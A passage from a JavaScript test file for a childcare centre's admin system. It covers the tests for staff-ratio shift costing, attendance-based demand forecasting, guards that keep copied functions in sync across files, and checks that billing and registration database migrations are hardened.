            { pay_type: 'hourly', hourly_rate: 50, room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 10, room_id: 'b' },
        ], 'a')).toBe(50);
    });
    test('salaried staff are excluded — a salary does not change with a child', () => {
        expect(_ratioStepWage([{ pay_type: 'salary', salary_biweekly: 2000, room_id: 'a' }], 'a')).toBe(0);
    });
    test('zero and missing rates are ignored rather than averaged in', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 0,  room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 20, room_id: 'a' },
        ], 'a')).toBe(20);
    });
    test('no wage data at all returns 0 (callers must treat as unknown)', () => {
        expect(_ratioStepWage([], 'a')).toBe(0);
    });
});

describe('_ratioStaffNeed — teachers a shift requires', () => {
    test('rounds up to the next whole teacher', () => {
        expect(_ratioStaffNeed(9, 4)).toBe(3);
    });
    test('an exact multiple needs no extra teacher', () => {
        expect(_ratioStaffNeed(8, 4)).toBe(2);
    });
    test('an empty shift needs nobody', () => {
        expect(_ratioStaffNeed(0, 4)).toBe(0);
    });
    test('an unset ratio is unknown, not zero', () => {
        expect(_ratioStaffNeed(9, 0)).toBeNull();
    });
});

describe('_ratioStepOffer — what one more booking is worth', () => {
    const base = { rate: 75, ratio: 4, wage: 20, openSeats: 5,
                   headroomAm: 2, headroomPm: 2, amChildren: 6 };
    const offer = over => _ratioStepOffer(Object.assign({ isFullDay: true }, base, over));

    test('room with headroom on both shifts takes the child free', () => {
        const o = offer({});
        expect(o.verdict).toBe('free');
        expect(o.cost).toBe(0);
        expect(o.margin).toBe(75);
    });
    test('tripping only the morning costs one morning shift', () => {
        const o = offer({ headroomAm: 0 });
        expect(o.stepsAm).toBe(true);
        expect(o.stepsPm).toBe(false);
        expect(o.cost).toBe(100);            // 5 h x 20
        expect(o.margin).toBe(-25);
    });
    test('tripping only the afternoon costs one afternoon shift', () => {
        const o = offer({ headroomPm: 0 });
        expect(o.stepsAm).toBe(false);
        expect(o.stepsPm).toBe(true);
        expect(o.cost).toBe(100);
    });
    test('tripping both shifts costs a teacher all day', () => {
        const o = offer({ headroomAm: 0, headroomPm: 0 });
        expect(o.cost).toBe(200);            // 10 h x 20
        expect(o.margin).toBe(-125);
    });
    test('a half day never trips the afternoon — it has already gone home', () => {
        const o = _ratioStepOffer(Object.assign({}, base,
            { isFullDay: false, rate: 45, headroomPm: 0 }));
        expect(o.stepsPm).toBe(false);
        expect(o.verdict).toBe('free');
        expect(o.margin).toBe(45);
    });
    test('a half day still trips the morning it shares', () => {
        const o = _ratioStepOffer(Object.assign({}, base,
            { isFullDay: false, rate: 45, headroomAm: 0 }));
        expect(o.stepsAm).toBe(true);
        expect(o.cost).toBe(100);
        expect(o.margin).toBe(-55);
    });
    test('no seat outranks any ratio headroom', () => {
        expect(offer({ openSeats: 0 }).verdict).toBe('full');
        expect(offer({ openSeats: -1 }).verdict).toBe('full');
    });
    test('an unset ratio is reported, never guessed', () => {
        const o = offer({ ratio: 0 });
        expect(o.verdict).toBe('no-ratio');
        expect(o.margin).toBeNull();
    });
    test('a rate of zero means the booking type is not offered', () => {
        expect(offer({ rate: 0 }).verdict).toBe('not-offered');
    });
    test('unknown wage yields a null margin, never a free teacher', () => {
        const o = offer({ headroomAm: 0, wage: 0 });
        expect(o.verdict).toBe('step');
        expect(o.cost).toBeNull();
        expect(o.margin).toBeNull();
    });
    test('an empty room reports opening it rather than a plain step', () => {
        expect(offer({ headroomAm: 0, headroomPm: 0, amChildren: 0 }).verdict).toBe('opens');
    });
});

describe('_buildRatioStepRows — AM/PM shift split', () => {
    test('the afternoon drops the half-day children', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.amChildren).toBe(10);
        expect(r.pmChildren).toBe(3);
        expect(r.half).toBe(7);
    });
    test('each shift is staffed to its own occupancy', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.staffAm).toBe(3);           // ceil(10/4)
        expect(r.staffPm).toBe(1);           // ceil(3/4)
    });
    test('teachers the afternoon does not need are counted as releasable', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.releasable).toBe(2);
        expect(r.releasableHours).toBe(10);  // 2 teachers x 5 h
    });
    test('an all-full-day room releases nobody at midday', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8, 0))[0];
        expect(r.pmChildren).toBe(8);
        expect(r.releasable).toBe(0);
        expect(r.releasableHours).toBe(0);
    });
    test('headroom is tracked per shift', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.headroomAm).toBe(2);        // 3 teachers cover 12
        expect(r.headroomPm).toBe(1);        // 1 teacher covers 4
    });
    test('when the morning is the tight shift, the full day is the better sale', () => {
        // 8 children, 3 half → AM 8 (headroom 0), PM 5 (headroom 3)
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8, 3))[0];
        expect(r.headroomAm).toBe(0);
        expect(r.headroomPm).toBe(3);
        // Both trip the same morning teacher and nothing else, so the labor is
        // identical either way — take the higher rate.
        expect(r.fullDay.cost).toBe(100);
        expect(r.halfDay.cost).toBe(100);
        expect(r.fullDay.margin).toBe(-25);  // 75 - 100
        expect(r.halfDay.margin).toBe(-55);  // 45 - 100
    });
    test('both shifts on the boundary costs a full-day child a teacher all day', () => {
        // 8 children, 4 half → AM 8 (headroom 0), PM 4 (headroom 0)
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8, 4))[0];
        expect(r.headroomAm).toBe(0);
        expect(r.headroomPm).toBe(0);
        expect(r.fullDay.cost).toBe(200);    // both shifts
        expect(r.fullDay.margin).toBe(-125);
        expect(r.halfDay.cost).toBe(100);    // morning only
        expect(r.halfDay.margin).toBe(-55);
    });
    test('a slack morning with a tight afternoon makes the half day free', () => {
        // 6 children, 2 half → AM 6 (headroom 2), PM 4 (headroom 0)
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(6, 2))[0];
        expect(r.headroomAm).toBe(2);
        expect(r.headroomPm).toBe(0);
        expect(r.halfDay.verdict).toBe('free');
        expect(r.halfDay.margin).toBe(45);
        expect(r.fullDay.verdict).toBe('step');
        expect(r.fullDay.margin).toBe(-25);  // 75 - 100 for the afternoon teacher
    });
    test('a full-day-only room offers no half day', () => {
        const r = _rsRun([_rsRoom({ fullDayOnly: true, halfDayRate: null })],
            _RS_WAGE, _rsFill(4))[0];
        expect(r.halfDay.verdict).toBe('not-offered');
        expect(r.halfRate).toBe(0);
    });
    test('a room with no half-day rate offers no half day', () => {
        const r = _rsRun([_rsRoom({ halfDayRate: 0 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.halfDay.verdict).toBe('not-offered');
    });
    test('an empty room is a step on both shifts — the first child needs a teacher', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [])[0];
        expect(r.amChildren).toBe(0);
        expect(r.staffAm).toBe(0);
        expect(r.fullDay.verdict).toBe('opens');
        expect(r.fullDay.margin).toBe(-125); // 75 - 200 (both shifts)
        expect(r.halfDay.margin).toBe(-55);  // 45 - 100 (morning only)
    });
    test('a full room reports no sellable seat for either booking type', () => {
        const r = _rsRun([_rsRoom({ capacity: 4 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.openSeats).toBe(0);
        expect(r.fullDay.verdict).toBe('full');
        expect(r.halfDay.verdict).toBe('full');
    });
    test('an overbooked room is still full, not sellable', () => {
        const r = _rsRun([_rsRoom({ capacity: 3 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.openSeats).toBe(-1);
        expect(r.fullDay.verdict).toBe('full');
    });
    test('open seats are counted against the morning, when the room is fullest', () => {
        const r = _rsRun([_rsRoom({ capacity: 10 })], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.openSeats).toBe(0);         // not 7, despite the empty afternoon
    });
    test('an unset ratio leaves every shift figure unknown', () => {
        const r = _rsRun([_rsRoom({ staffRatio: 0 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.staffAm).toBeNull();
        expect(r.headroomAm).toBeNull();
        expect(r.releasable).toBeNull();
        expect(r.fullDay.verdict).toBe('no-ratio');
    });
    test('waitlisted bookings are excluded from the count', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [{ room: 'a' }, { room: 'a', wl: true }])[0];
        expect(r.amChildren).toBe(1);
    });
    test('unconfirmed registrations are excluded from the count', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [{ room: 'a' }, { room: 'a', status: 'pending' }])[0];
        expect(r.amChildren).toBe(1);
    });
    test('per-date room override wins over the registration room', () => {
        allRegistrations = [{ status: 'confirmed', room_id: 'b', registration_dates: [
            { care_date: '2026-08-11', room_id: 'a', day_type: 'full', waitlisted: false }] }];
        const r = _buildRatioStepRows(['2026-08-11'], [_rsRoom()], _RS_WAGE)[0];
        expect(r.amChildren).toBe(1);
    });
    test('emits one row per room per day', () => {
        const rows = _rsRun([_rsRoom(), _rsRoom({ id: 'b', label: 'B' })], _RS_WAGE,
            _rsFill(2), ['2026-08-11', '2026-08-12']);
        expect(rows.length).toBe(4);
    });
    test('bookings outside the requested week are ignored', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE,
            [{ room: 'a' }, { room: 'a', date: '2026-09-01' }])[0];
        expect(r.amChildren).toBe(1);
    });
    test('real case — Bear Room, 6 full-day children at 1:3, one from a 3rd teacher', () => {
        const bear = _rsRoom({ id: 'bear', staffRatio: 3, capacity: 9,
                               fullDayRate: 80, fullDayOnly: true, halfDayRate: null });
        const r = _rsRun([bear], [{ pay_type: 'hourly', hourly_rate: 16.83, room_id: 'bear' }],
            _rsFill(6, 0, 'bear'))[0];
        expect(r.staffAm).toBe(2);
        expect(r.staffPm).toBe(2);           // no half-days, so no midday relief
        expect(r.releasable).toBe(0);
        expect(r.headroomAm).toBe(0);
        expect(r.openSeats).toBe(3);         // seats look available...
        expect(r.fullDay.verdict).toBe('step');
        expect(r.fullDay.margin).toBeCloseTo(-88.3, 1);   // 80 - 168.30, both shifts
    });
    test('real case — Goose Room, 10 children with 7 half-day, frees 2 afternoon teachers', () => {
        const goose = _rsRoom({ id: 'goose', staffRatio: 8, capacity: 15,
                                fullDayRate: 75, halfDayRate: 45 });
        const r = _rsRun([goose], [{ pay_type: 'hourly', hourly_rate: 16.83, room_id: 'goose' }],
            _rsFill(10, 7, 'goose'))[0];
        expect(r.amChildren).toBe(10);
        expect(r.pmChildren).toBe(3);
        expect(r.staffAm).toBe(2);
        expect(r.staffPm).toBe(1);
        expect(r.releasableHours).toBe(5);   // one teacher can leave at midday
        expect(r.fullDay.verdict).toBe('free');
    });
});

// ── Demand forecast (copied from js/admin/admin-reports.js) ──
// Projects bookings from the same-weekday average, falling back to a moving
// average, and converts to expected attendance via a measured show rate.
const FORECAST_MIN_SAMPLES = 4;

function _forecastMean(values) {
    if (!values || !values.length) return null;
    return values.reduce((sum, v) => sum + v, 0) / values.length;
}

function _forecastShowRate(attendanceRows) {
    let present = 0, marked = 0;
    (attendanceRows || []).forEach(r => {
        if (r.status === 'present')     { present++; marked++; }
        else if (r.status === 'absent') { marked++; }
    });
    if (marked === 0) return null;
    return { rate: present / marked, marked };
}

function _forecastConfidence(sampleCount) {
    if (!sampleCount)                          return 'none';
    if (sampleCount < FORECAST_MIN_SAMPLES)    return 'thin';
    return 'good';
}

function _buildForecastRows(opts) {
    const { targetDates, rooms, history, recent, booked, showRate } = opts;
    const rows = [];

    targetDates.forEach(date => {
        const dow = new Date(date + 'T00:00:00').getDay();
        rooms.forEach(room => {
            const h        = history[room.id]?.[dow] || { totals: [], halves: [] };
            const samples  = h.totals.length;
            const weekday  = _forecastMean(h.totals);
            const moving   = _forecastMean(recent[room.id]);
            // Prefer the weekday-specific estimate; fall back to the flat level
            // only when that weekday has never been seen for this room.
            const forecast = weekday !== null ? weekday : moving;

            // Half-day share drives the afternoon, so carry it through rather
            // than assuming the mix holds at the center-wide average.
            const meanHalf  = _forecastMean(h.halves);
            const halfShare = (forecast && meanHalf !== null && weekday)
                ? Math.min(1, meanHalf / weekday)
                : 0;

            const bookedNow  = booked[date]?.[room.id]?.total || 0;
            const expected   = (forecast !== null && showRate) ? forecast * showRate.rate : null;
            // Staff to what we expect to walk in where that is known, else to
            // the booking forecast.
            const basis      = expected !== null ? expected : forecast;
            const amChildren = basis === null ? null : Math.round(basis);
            const pmChildren = amChildren === null ? null : Math.round(basis * (1 - halfShare));
            const staffAm    = amChildren === null ? null : _ratioStaffNeed(amChildren, room.staffRatio || 0);
            const staffPm    = pmChildren === null ? null : _ratioStaffNeed(pmChildren, room.staffRatio || 0);

            rows.push({
                date, dow, roomId: room.id, roomLabel: room.label,
                samples, confidence: _forecastConfidence(samples),
                weekdayAvg: weekday, movingAvg: moving, forecast,
                halfShare, bookedNow, expected,
                amChildren, pmChildren, staffAm, staffPm,
                capacity: room.capacity || 0,
                overCapacity: room.capacity > 0 && amChildren !== null && amChildren > room.capacity,
            });
        });
    });
    return rows;
}

const _fcRoom = (over = {}) =>
    Object.assign({ id: 'a', label: 'A', staffRatio: 4, capacity: 20 }, over);
// history[roomId][dow] = { totals, halves }
const _fcHist = (dow, totals, halves = totals.map(() => 0)) => ({ a: { [dow]: { totals, halves } } });
const _fcRun = (over = {}) => _buildForecastRows(Object.assign({
    targetDates: ['2026-08-13'],           // a Thursday (dow 4)
    rooms: [_fcRoom()],
    history: _fcHist(4, [8, 8, 8, 8]),
    recent: { a: [4, 4] },
    booked: {},
    showRate: null,
}, over))[0];

describe('_forecastMean — an absent estimate is not zero', () => {
    test('averages a list', () => { expect(_forecastMean([2, 4])).toBe(3); });
    test('an empty list has no estimate', () => { expect(_forecastMean([])).toBeNull(); });
    test('a missing list has no estimate', () => { expect(_forecastMean(null)).toBeNull(); });
    test('a measured zero is an estimate of zero, not a missing one', () => {
        expect(_forecastMean([0, 0])).toBe(0);
    });
});

describe('_forecastShowRate — measured from marked days only', () => {
    test('no marks means no show rate', () => {
        expect(_forecastShowRate([])).toBeNull();
        expect(_forecastShowRate(null)).toBeNull();
    });
    test('everyone present is a full show rate', () => {
        expect(_forecastShowRate([{ status: 'present' }, { status: 'present' }]).rate).toBe(1);
    });
    test('present over marked, not over booked', () => {
        const r = _forecastShowRate([
            { status: 'present' }, { status: 'present' },
            { status: 'present' }, { status: 'absent' },
        ]);
        expect(r.rate).toBe(0.75);
        expect(r.marked).toBe(4);
    });
    test('unrecognized statuses are ignored rather than counted as absent', () => {
        const r = _forecastShowRate([{ status: 'present' }, { status: 'unknown' }]);
        expect(r.rate).toBe(1);
        expect(r.marked).toBe(1);
    });
    test('all absent is a zero show rate, not a missing one', () => {
        expect(_forecastShowRate([{ status: 'absent' }]).rate).toBe(0);
    });
});

describe('_forecastConfidence — how much history is behind an estimate', () => {
    test('never seen', () => { expect(_forecastConfidence(0)).toBe('none'); });
    test('seen once is thin', () => { expect(_forecastConfidence(1)).toBe('thin'); });
    test('just under the bar is thin', () => { expect(_forecastConfidence(3)).toBe('thin'); });
    test('at the bar is good', () => { expect(_forecastConfidence(4)).toBe('good'); });
});

describe('_buildForecastRows — projecting the weeks ahead', () => {
    test('uses the same-weekday average for that weekday', () => {
        const r = _fcRun();
        expect(r.weekdayAvg).toBe(8);
        expect(r.forecast).toBe(8);
        expect(r.amChildren).toBe(8);
    });
    test('a different weekday does not borrow this one\'s history', () => {
        // history only for Thursday (4); target is a Monday
        const r = _fcRun({ targetDates: ['2026-08-10'] });
        expect(r.weekdayAvg).toBeNull();
        expect(r.forecast).toBe(4);          // falls back to the moving average
    });
    test('falls back to the moving average when the weekday is unseen', () => {
        const r = _fcRun({ history: { a: {} } });
        expect(r.weekdayAvg).toBeNull();
        expect(r.movingAvg).toBe(4);
        expect(r.forecast).toBe(4);
    });
    test('no history at all leaves the projection unknown, not zero', () => {
        const r = _fcRun({ history: { a: {} }, recent: { a: [] } });
        expect(r.forecast).toBeNull();
        expect(r.amChildren).toBeNull();
        expect(r.staffAm).toBeNull();
    });
    test('a show rate converts bookings into expected attendance', () => {
        const r = _fcRun({ showRate: { rate: 0.75, marked: 40 } });
        expect(r.forecast).toBe(8);          // bookings
        expect(r.expected).toBe(6);          // 8 x 0.75
        expect(r.amChildren).toBe(6);        // staffed to who shows up
    });
    test('without a show rate the projection stays at the booking level', () => {
        const r = _fcRun();
        expect(r.expected).toBeNull();
        expect(r.amChildren).toBe(8);
    });
    test('the afternoon drops that weekday\'s half-day share', () => {
        const r = _fcRun({ history: _fcHist(4, [8, 8, 8, 8], [4, 4, 4, 4]) });
        expect(r.halfShare).toBe(0.5);
        expect(r.amChildren).toBe(8);
        expect(r.pmChildren).toBe(4);
    });
    test('staffing follows the ratio on each projected shift', () => {
        const r = _fcRun({ history: _fcHist(4, [8, 8, 8, 8], [4, 4, 4, 4]) });
        expect(r.staffAm).toBe(2);           // ceil(8/4)
        expect(r.staffPm).toBe(1);           // ceil(4/4)
    });
    test('a projection above capacity is flagged', () => {
        const r = _fcRun({ rooms: [_fcRoom({ capacity: 5 })] });
        expect(r.amChildren).toBe(8);
        expect(r.overCapacity).toBe(true);
    });
    test('a projection within capacity is not flagged', () => {
        expect(_fcRun().overCapacity).toBe(false);
    });
    test('bookings already on the books are carried through', () => {
        const r = _fcRun({ booked: { '2026-08-13': { a: { total: 3, half: 1 } } } });
        expect(r.bookedNow).toBe(3);
        expect(r.forecast).toBe(8);          // forecast is independent of them
    });
    test('a date with no bookings yet reports zero booked, not unknown', () => {
        expect(_fcRun().bookedNow).toBe(0);
    });
    test('confidence reflects how many times the weekday was seen', () => {
        expect(_fcRun({ history: _fcHist(4, [8, 8, 8, 8]) }).confidence).toBe('good');
        expect(_fcRun({ history: _fcHist(4, [8, 8]) }).confidence).toBe('thin');
        expect(_fcRun({ history: { a: {} } }).confidence).toBe('none');
    });
    test('emits one row per room per target date', () => {
        const rows = _buildForecastRows({
            targetDates: ['2026-08-13', '2026-08-14'],
            rooms: [_fcRoom(), _fcRoom({ id: 'b', label: 'B' })],
            history: {}, recent: {}, booked: {}, showRate: null,
        });
        expect(rows.length).toBe(4);
    });
    test('a half-day share cannot exceed the whole', () => {
        // more halves than totals would be corrupt input; clamp rather than
        // produce a negative afternoon
        const r = _fcRun({ history: _fcHist(4, [4, 4], [8, 8]) });
        expect(r.halfShare).toBe(1);
        expect(r.pmChildren).toBe(0);
    });
});

describe('source-drift guard — copies must match js/ source', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const selfText = fs.readFileSync(__filename, 'utf8');

    const GUARDED = [
        ['calcAgeMonths',      'js/supabase.js'],
        ['roomIdForAgeMonths', 'js/supabase.js'],
        ['getRoomIdFromDob',   'js/supabase.js'],
        ['effectiveRate',      'js/app.js'],
        ['getWeekMonday',      'js/app.js'],
        ['csvCell',            'js/admin/admin-core.js'],
        ['_ratioStepWage',     'js/admin/admin-reports.js'],
        ['_ratioStaffNeed',    'js/admin/admin-reports.js'],
        ['_ratioStepOffer',    'js/admin/admin-reports.js'],
        ['_buildRatioStepRows','js/admin/admin-reports.js'],
        ['_forecastMean',       'js/admin/admin-reports.js'],
        ['_forecastShowRate',   'js/admin/admin-reports.js'],
        ['_forecastConfidence', 'js/admin/admin-reports.js'],
        ['_buildForecastRows',  'js/admin/admin-reports.js'],
        ['_buildArRows',        'js/admin/admin-billing.js'],
        ['_procareDupKey',      'js/admin/admin-billing.js'],
        ['_procareDupCounts',   'js/admin/admin-billing.js'],
    ];

    for (const [fnName, relPath] of GUARDED) {
        test(`${fnName} matches ${relPath}`, () => {
            const srcText = fs.readFileSync(path.join(repoRoot, relPath), 'utf8');
            const fromSource = extractFunction(srcText, fnName);
            const fromTest   = extractFunction(selfText, fnName);

            if (!fromSource) throw new Error(`${fnName} not found in ${relPath} — was it renamed or removed?`);
            if (!fromTest)   throw new Error(`${fnName} not found in this test file`);

            if (normalize(fromSource) !== normalize(fromTest)) {
                throw new Error(
                    `${fnName} has drifted from ${relPath}.\n` +
                    `      The tests above are therefore testing code that is no longer in production.\n` +
                    `      Re-sync the copy in js/tests/business-logic.test.js with the source.\n` +
                    `      --- ${relPath} ---\n      ${normalize(fromSource)}\n` +
                    `      --- test copy ---\n      ${normalize(fromTest)}`
                );
            }
        });
    }
});

describe('cross-file drift guard — worker.js SSR copies must match js/ source', () => {
    const repoRoot   = path.resolve(__dirname, '..', '..');
    const read       = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const workerText = read('worker.js');

    // worker.js server-renders the home page's classroom cards so a crawler sees
    // ages/rates/capacity in the HTML instead of an empty <div>. It cannot import
    // from js/ — those files are classic browser scripts with top-level side
    // effects, and the pages load them unbundled in local dev — so it holds
    // copies. These tests are what keep the copies honest.
    const PAIRS = [
        ['escHtml',                 'js/supabase.js'],
        ['getSortedRooms',          'js/supabase.js'],
        ['buildPublicRoomCardsHtml', 'js/app.js'],
    ];

    for (const [fnName, relPath] of PAIRS) {
        test(`worker.js ${fnName} matches ${relPath}`, () => {
            const fromSource = extractFunction(read(relPath), fnName);
            const fromWorker = extractFunction(workerText, fnName);
            if (!fromSource) throw new Error(`${fnName} not found in ${relPath} — renamed or removed?`);
            if (!fromWorker) throw new Error(`${fnName} not found in worker.js — the SSR copy was removed?`);
            if (normalize(fromSource) !== normalize(fromWorker)) {
                throw new Error(
                    `${fnName} has drifted between worker.js and ${relPath}.\n` +
                    `      The server-rendered classroom cards no longer match what the browser renders,\n` +
                    `      so Google would index different markup than a visitor sees.\n` +
                    `      --- ${relPath} ---\n      ${normalize(fromSource)}\n` +
                    `      --- worker.js ---\n      ${normalize(fromWorker)}`
                );
            }
        });
    }

    // Pull an array/object literal out of a source file and evaluate it. These
    // are plain data literals with no identifier references, so there is nothing
    // to resolve — but compare VALUES rather than text, because worker.js keeps
    // its copy on one line per room and js/supabase.js spreads it over twelve.
    function extractLiteral(sourceText, name, openCh, closeCh) {
        const start = sourceText.search(new RegExp(`^const\\s+${name}\\s*=\\s*\\${openCh}`, 'm'));
        if (start === -1) return null;
        const open = sourceText.indexOf(openCh, start);
        let depth = 0, i = open;
        for (; i < sourceText.length; i++) {
            const c = sourceText[i];
            if (c === openCh) depth++;
            else if (c === closeCh) { depth--; if (depth === 0) { i++; break; } }
        }
        // eslint-disable-next-line no-eval
        return eval(`(${sourceText.slice(open, i)})`);
    }

    test('worker.js ROOM_CAPACITY_NOUNS matches js/app.js', () => {
        const a = extractLiteral(read('js/app.js'), 'ROOM_CAPACITY_NOUNS', '{', '}');
        const b = extractLiteral(workerText,        'ROOM_CAPACITY_NOUNS', '{', '}');
        if (!a || !b) throw new Error('ROOM_CAPACITY_NOUNS not found in one of the two files');
        expect(JSON.stringify(b)).toBe(JSON.stringify(a));
    });

    // Only the fields the server-side renderer actually reads. worker.js
    // deliberately does not carry the rest of the ROOMS shape (seasons, status
    // metadata it never consults), so a whole-object compare would fail for no
    // reason a reader could act on.
    test('worker.js ROOMS matches the SSR-relevant fields of js/supabase.js ROOMS', () => {
        const SSR_FIELDS = ['id', 'label', 'ages', 'ageMinMonths', 'capacity',
                            'fullDayOnly', 'fullDayRate', 'halfDayRate', 'staffRatio'];
        const pick = list => list.map(r => Object.fromEntries(SSR_FIELDS.map(f => [f, r[f] ?? null])));

        const source = extractLiteral(read('js/supabase.js'), 'ROOMS', '[', ']');
        const worker = extractLiteral(workerText,             'ROOMS', '[', ']');
        if (!source || !worker) throw new Error('ROOMS not found in one of the two files');

        const want = JSON.stringify(pick(source), null, 1);
        const got  = JSON.stringify(pick(worker), null, 1);
        if (want !== got) {
            throw new Error(
                'ROOMS has drifted between worker.js and js/supabase.js.\n' +
                '      A room added, renamed or re-priced in js/supabase.js must be mirrored in\n' +
                "      worker.js's SSR copy, or the server-rendered cards will be wrong.\n" +
                `      --- js/supabase.js ---\n      ${want}\n` +
                `      --- worker.js ---\n      ${got}`
            );
        }
    });

    // supabase/functions/waitlist-status/index.ts's own comment says BASE_ROOMS mirrors
    // js/supabase.js's ROOMS, but (unlike worker.js's copy above) nothing was ever checking that
    // -- an id-keyed object rather than the id-carrying array js/supabase.js uses, so it needs its
    // own extractor tolerant of the TypeScript type annotation between the name and `=`.
    test('waitlist-status BASE_ROOMS matches the label/capacity/age window of js/supabase.js ROOMS', () => {
        function extractTsObjectLiteral(sourceText, name) {
            const match = sourceText.match(new RegExp(`^const\\s+${name}\\s*(?::[^=]+)?=\\s*\\{`, 'm'));
            if (!match) return null;
            const open = match.index + match[0].length - 1;
            let depth = 0, i = open;
            for (; i < sourceText.length; i++) {
                const c = sourceText[i];
                if (c === '{') depth++;
                else if (c === '}') { depth--; if (depth === 0) { i++; break; } }
            }
            // eslint-disable-next-line no-eval
            return eval(`(${sourceText.slice(open, i)})`);
        }

        const ROOMS_FIELDS = ['label', 'capacity', 'ageMinMonths', 'ageMaxMonths'];
        const source = extractLiteral(read('js/supabase.js'), 'ROOMS', '[', ']');
        const baseRooms = extractTsObjectLiteral(
            read('supabase/functions/waitlist-status/index.ts'), 'BASE_ROOMS'
        );
        if (!source) throw new Error('ROOMS not found in js/supabase.js');
        if (!baseRooms) throw new Error('BASE_ROOMS not found in supabase/functions/waitlist-status/index.ts');

        // 'summer' is deliberately excluded here, matching this file's own comment ("'summer' is
        // excluded -- same as wlpRooms()") and js/admin/admin-waitlist.js's wlpRooms(), which
        // filters it the same way: Summer Camp is seasonal, not a year-round waitlist room.
        const fromSource = Object.fromEntries(
            source.filter(r => r.id !== 'summer')
                  .map(r => [r.id, Object.fromEntries(ROOMS_FIELDS.map(f => [f, r[f] ?? null]))])
        );
        const fromWaitlist = Object.fromEntries(
            Object.entries(baseRooms).map(([id, r]) => [id, Object.fromEntries(ROOMS_FIELDS.map(f => [f, r[f] ?? null]))])
        );

        const want = JSON.stringify(fromSource, null, 1);
        const got  = JSON.stringify(fromWaitlist, null, 1);
        if (want !== got) {
            throw new Error(
                'BASE_ROOMS has drifted from js/supabase.js ROOMS.\n' +
                '      A room added, renamed, re-capacitied or re-aged in js/supabase.js must be\n' +
                '      mirrored in waitlist-status/index.ts\'s BASE_ROOMS, or waitlist position and\n' +
                '      capacity logic will disagree with the live room config.\n' +
                `      --- js/supabase.js ---\n      ${want}\n` +
                `      --- waitlist-status/index.ts ---\n      ${got}`
            );
        }
    });
});

describe('billing invoice integrity guards', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('billing_invoice_integrity');
    const billingUi = read('js/admin/admin-billing.js');
    const billMonth = read('js/admin/admin-bill-month.js');
    const boundary = readMigration('harden_public_registration_billing_boundary');
    const publicApp = read('js/app.js');
    const supabaseClient = read('js/supabase.js');
    const adminCalendar = read('js/admin/admin-calendar.js');

    test('database calculator constrains care dates to the requested month', () => {
        expect(migration.includes('rd.care_date >= v_month_start')).toBe(true);
        expect(migration.includes('rd.care_date <  v_month_end')).toBe(true);
    });

    test('finalized imports count as issued invoices', () => {
        expect(migration.includes("status IN ('sent', 'finalized', 'paid', 'partial')")).toBe(true);
    });

    test('zero-booking reconciliation removes stale drafts', () => {
        expect(/v_base = 0 AND v_final = 0[\s\S]*?DELETE FROM billing_invoices[\s\S]*?status = 'draft'/.test(migration)).toBe(true);
    });

    test('private reconciler is not executable by browser roles', () => {
        expect(/REVOKE EXECUTE ON FUNCTION public\._reconcile_billing_invoice_internal[\s\S]*?PUBLIC, anon, authenticated/.test(migration)).toBe(true);
    });

    test('normal admin generation no longer writes caller-calculated amounts', () => {
        expect(billingUi.includes('upsertBillingInvoice(')).toBe(false);
        expect(billMonth.includes('upsertBillingInvoice(')).toBe(false);
        expect(billingUi.includes('reconcileBillingInvoice(')).toBe(true);
        expect(billMonth.includes('reconcileBillingInvoice(')).toBe(true);
    });

    test('admin pricing honors per-date room promotions and weekly rates', () => {
        const reports = read('js/admin/admin-reports.js');
        expect(reports.includes('date.room_id || reg.room_id')).toBe(true);
        expect(reports.includes('weeklyFullRate')).toBe(true);
        expect(reports.includes('weeklyHalfRate')).toBe(true);
    });

    test('registration and invoice reconciliation share one server transaction', () => {
        const datesInsertAt = boundary.indexOf('INSERT INTO public.registration_dates');
        const reconcileAt = boundary.indexOf('public._reconcile_billing_invoice_internal');
        expect(datesInsertAt).toBeGreaterThan(-1);
        expect(reconcileAt).toBeGreaterThan(datesInsertAt);
        expect(boundary.includes("SET search_path = ''")).toBe(true);
    });

    test('anonymous billing cannot be triggered by email independently', () => {
        expect(/DROP FUNCTION IF EXISTS public\.create_billing_invoice_by_email\(text, char\(7\), numeric\);[\s\S]*DROP FUNCTION IF EXISTS public\.create_billing_invoice_by_email\(text, char\(7\)\);/.test(boundary)).toBe(true);
        expect(publicApp.includes('createInvoiceByEmail(')).toBe(false);
        expect(supabaseClient.includes('async function createInvoiceByEmail')).toBe(false);
        expect(adminCalendar.includes('reconcileBillingInvoice(family.id, monthKey)')).toBe(true);
    });

    test('anonymous registration has an expiring rate boundary and private hashed audit', () => {
        expect(boundary.includes("r.created_at >= now() - interval '15 minutes'")).toBe(true);
        expect(boundary.includes('CREATE TABLE IF NOT EXISTS private.registration_submission_audit')).toBe(true);
        expect(boundary.includes("extensions.digest(v_email, 'sha256')")).toBe(true);
        expect(/REVOKE ALL ON TABLE private\.registration_submission_audit[\s\S]*PUBLIC, anon, authenticated/.test(boundary)).toBe(true);
        expect(/registration_submission_audit[\s\S]*?\bemail\s+text/i.test(boundary)).toBe(false);
    });

    test('submit_registration is granted explicitly, never through PUBLIC', () => {
